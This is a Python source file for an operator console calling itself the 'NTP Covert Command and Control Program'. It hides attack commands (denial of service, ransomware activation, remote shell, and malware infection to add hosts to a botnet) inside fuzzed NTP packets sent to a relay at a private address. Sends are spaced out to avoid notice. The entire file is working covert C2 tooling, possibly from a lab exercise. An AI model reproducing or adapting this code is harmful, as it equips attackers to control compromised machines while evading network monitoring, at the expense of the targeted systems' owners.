#! /usr/bin/env python3
import sys
from datetime import datetime
from kamene.all import *
import time
import re
import subprocess

class Main:
	def __init__(self):
		self.commands = {
			"help": self._menu,
			"set_target": self._set_target,
			"target": self._target,
			"dos": self._dos,
			"ransom": self._ransom,
			"rat": self._rat,
			"infect": self._infect,
			"exit": "exit",
			"quit": "exit"
		}
		
		self.target = '0.0.0.0'
		self.last_time = datetime.now()

	def _dottedDecimalEncode(self, string):
		return ".".join([str(int.from_bytes(char.encode("utf-8"), "big")) for char in string])

	def _menu(self):
		print("#############################")
		print("#           MENU            #")
		print("#############################")
		print()
		print("Commands")
		print("------------")
		print("set_target <ip_addr>:")
		print("Sets the target ip address for the attack.")
		print("Takes an IPv4 address in dotted decimal format.")
		print("Example:")
		print("\tset_target 10.4.8.1")
		print("\t> The new target is 10.4.8.1")
		print()
		print()
		print("target")
		print("Prints the current target IP address.")
		print("Example:")
		print("\ttarget")
		print("\t> Current target is 10.4.8.1")
		print()
		print()
		print("dos [<ip_addr>]:")
		print("Executes a Denial-Of-Service attack against the current target.")
		print("Optionally takes an IPv4 address as the target.")
		print("Example:")
		print("\tdos 10.4.8.1")
		print("\t> Executing a DOS attack on 10.4.8.1.")
		print()
		print()
		print("ransom [<ip_addr>]:")
		print("Activates ransomware on the current target.")
		print("Optionally takes an IPv4 address as the target.")
		print("Example:")
		print("\transom")
		print("\t> Activating ransomware on 10.4.8.1")
		print()
		print()
		print("rat [<ip_addr>]:")
		print("Opens a remote shell on the current target.")
		print("Optionally takes an IPv4 address as the target.")
		print("Example:")
		print("\trat 10.4.8.1")
		print("\t> Opening a shell to 10.4.8.1")
		print()
		print()
		print("infect [<ip_addr>]:")
		print("Infects the current target with malware and adds it to the botnet.")
		print("Optionally takes an IPv4 address as the target.")
		print("Example:")
		print("\tinfect")
		print("\t> Infecting 10.4.8.1 and adding to botnet")
		print()
		print()

	def _wait_to_send(self):
		# check if another message was sent too recently
		now = datetime.now()
		while (now - self.last_time).seconds < 8:
			time.sleep(0.125)
			now = datetime.now()
		self.last_time = now

	def _set_target(self, target=None):
		if target is None:
			print("set_target requires an IPv4 address")
			return
		self.target = target
		print("The new target is", self.target)

	def _target(self, arg=None):
		# arg is unused. Only exists to prevent crashes if users give it an arg
		print("Current target is", self.target)
	
	def _dos(self, target=None):
		if target is None:
			target = self.target
		print("Executing a DOS attack on", target)
		
		self._wait_to_send()
		send(IP(dst="10.4.8.65")/fuzz(UDP()/NTP(version=4, id=target)))
		self._wait_to_send()
		send(IP(dst="10.4.8.65")/fuzz(UDP()/NTP(version=4, id=self._dottedDecimalEncode("\0DOS"))))
	
	def _ransom(self, target=None):
		if target is None:
			target = self.target
		print("Activating ransomware on", target)

		self._wait_to_send()
		send(IP(dst="10.4.8.65")/fuzz(UDP()/NTP(version=4, id=target)))
		self._wait_to_send()
		send(IP(dst="10.4.8.65")/fuzz(UDP()/NTP(version=4, id=self._dottedDecimalEncode("\0RNS"))))
	
	def _rat(self, target=None):
		if target is None:
			target = self.target
		print("Opening a shell to", target)

		self._wait_to_send()
		send(IP(dst="10.4.8.65")/fuzz(UDP()/NTP(version=4, id=target)))
		self._wait_to_send()
		send(IP(dst="10.4.8.65")/fuzz(UDP()/NTP(version=4, id=self._dottedDecimalEncode("\0RAT"))))
	
	def _infect(self, target=None):
		if target is None:
			target = self.target
		print("Infecting", target, "and adding to botnet")

		self._wait_to_send()
		send(IP(dst="10.4.8.65")/fuzz(UDP()/NTP(version=4, id=target)))
		self._wait_to_send()
		send(IP(dst="10.4.8.65")/fuzz(UDP()/NTP(version=4, id=self._dottedDecimalEncode("\0IFT"))))
	
	def run(self):
		last_time = datetime.now()
		subprocess.run(["clear"])
		
		print("""
███╗   ██╗████████╗██████╗        ██████╗ ██████╗ ██████╗██████╗ 
████╗  ██║╚══██╔══╝██╔══██╗      ██╔════╝██╔════╝██╔════╝██╔══██╗
██╔██╗ ██║   ██║   ██████╔╝█████╗██║     ██║     ██║     ██████╔╝
██║╚██╗██║   ██║   ██╔═══╝ ╚════╝██║     ██║     ██║     ██╔═══╝ 
██║ ╚████║   ██║   ██║           ╚██████╗╚██████╗╚██████╗██║     
╚═╝  ╚═══╝   ╚═╝   ╚═╝            ╚═════╝ ╚═════╝ ╚═════╝╚═╝  """)
		print("Welcome to the NTP Covert Command and Control Program (NTP-CCCP)")
		print()
		print('Type "help" for help')
		print()
		while True:
			entry = input("Enter command: ").lower()
			entry_list = entry.split(" ")
			command = entry_list[0]
			if len(entry_list) > 1:
				arg = entry_list[1]
				if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', arg):
					print("Target argument must be a dotted decimal IPv4 address. Example: 10.4.8.1")
					continue
		
			if command in self.commands:
				func = self.commands[command]
				if func == "exit":
					break
				
				if len(entry_list) > 1:
					func(arg)
				else:
					func()
				
			else:
				print("Command not recognized:", command)
				continue
			
			print()	
	
	
if __name__ == "__main__":
	runner = Main()
	runner.run()
